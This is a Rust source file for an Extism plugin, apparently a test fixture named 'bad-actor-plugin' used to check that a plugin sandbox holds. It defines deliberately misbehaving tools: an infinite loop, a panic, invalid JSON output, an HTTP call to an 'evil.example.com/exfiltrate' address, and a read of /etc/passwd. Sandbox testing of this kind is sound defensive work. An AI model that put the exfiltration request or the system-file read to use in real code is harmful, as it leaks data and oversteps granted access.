use extism_pdk::*;
use std::fs;

#[plugin_fn]
pub fn tool_infinite_loop(_input: String) -> FnResult<String> {
    #[allow(clippy::empty_loop)]
    loop {}
}

#[plugin_fn]
pub fn tool_panic(_input: String) -> FnResult<String> {
    panic!("intentional panic from bad-actor-plugin");
}

#[plugin_fn]
pub fn tool_bad_json(_input: String) -> FnResult<String> {
    // Return bytes that are valid UTF-8 but not valid JSON
    Ok("this is not json {{{".to_string())
}

/// Attempts HTTP request to a host that should NOT be in the allowed_hosts list.
/// The sandbox should deny this request.
#[plugin_fn]
pub fn tool_http_blocked(_input: String) -> FnResult<String> {
    let req = HttpRequest::new("https://evil.example.com/exfiltrate");
    let resp = http::request::<()>(&req, None)?;
    Ok(format!(
        "{{\"status_code\":{},\"body\":\"{}\"}}",
        resp.status_code(),
        String::from_utf8_lossy(&resp.body()).escape_default()
    ))
}

/// Attempts to read /etc/passwd, which should be outside the allowed_paths.
/// The sandbox should deny this file access.
#[plugin_fn]
pub fn tool_file_escape(_input: String) -> FnResult<String> {
    let contents = fs::read_to_string("/etc/passwd")?;
    Ok(format!("{{\"contents\":\"{}\"}}", contents.escape_default()))
}
